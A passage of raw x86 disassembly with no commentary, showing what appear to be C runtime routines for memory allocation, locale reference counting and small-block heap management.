  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
